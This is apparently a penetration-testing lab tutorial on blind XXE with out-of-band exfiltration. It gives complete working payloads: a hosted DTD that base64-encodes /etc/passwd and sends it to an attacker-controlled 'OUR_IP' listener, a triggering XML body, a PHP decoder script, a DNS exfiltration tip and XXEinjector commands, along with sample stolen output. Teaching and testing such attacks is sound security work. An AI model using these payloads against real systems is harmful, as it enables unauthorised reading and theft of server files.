## Blind XXE and OOB Data Exfiltration

When a web application neither reflects XML entity values in its response nor displays runtime errors, standard and error-based XXE techniques both fail. Out-of-Band (OOB) exfiltration solves this by making the target server send the file data to your own machine rather than printing it in the response.

***

## How OOB XXE Works

Instead of reading data through the HTTP response, you craft a payload that encodes the target file contents and sends them as part of an outbound HTTP request back to a server you control. The core idea is to use a PHP filter to base64-encode the file, then embed that encoded string into a URL that the target server requests.

The DTD file you host on your machine contains:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

When `%file;` resolves, it holds the base64-encoded contents of `/etc/passwd`. When `%oob;` resolves, it builds a URL containing that data and forces the server to request it, delivering the file contents to your listener.

***

## Setting Up the Listener

Rather than using a plain Python HTTP server, use a PHP server with a small script that automatically decodes the incoming base64 data and prints it to the terminal.

1. Write the PHP decoder script:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

2. Save it as `index.php` and start the PHP development server:

```bash
vi index.php
php -S 0.0.0.0:8000
```

***

## Sending the Payload

Once your listener is running, send the following XML to the target application. It pulls in your hosted DTD, resolves the `%oob;` entity, and uses `&content;` to trigger the outbound request:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

The full attack flow runs in this order:

1. Target fetches your `xxe.dtd` file
2. `%file;` resolves and base64-encodes the target file
3. `%oob;` constructs the callback URL with the encoded data embedded
4. `&content;` triggers the HTTP request to your server
5. Your PHP script decodes and logs the file contents to the terminal

The terminal output will look like this once the request arrives:

```
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 [200]: (null) /xxe.dtd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

> Tip: As an alternative to HTTP-based OOB, you can exfiltrate data over DNS by encoding the file content as a subdomain of your domain, for example `ENCODEDTEXT.your.domain.com`. Use [tcpdump](https://www.tcpdump.org/) to capture incoming DNS traffic and decode the subdomain string. This method is more advanced and requires more setup but can bypass egress HTTP filtering.

***

## Automated OOB with XXEinjector

For cases where manual exploitation would be too slow, [XXEinjector](https://github.com/enjoiz/XXEinjector) automates the entire OOB process. It supports basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB exfiltration.

### Setup

Clone the tool to your machine:

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

Capture the raw HTTP request from [Burp Suite](https://portswigger.net/burp) and save it to a file. Include only the first XML line in the body and place `XXEINJECT` on the line after it as the injection marker:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

### Running the Tool

Use the flags below to run the OOB attack with PHP filter encoding:

```bash
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

The tool will not print the exfiltrated data directly to the terminal because it arrives base64-encoded. All retrieved files are saved automatically to the `Logs` folder inside the tool's directory, organised by target IP:

```bash
cat Logs/10.129.201.94/etc/passwd.log
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```
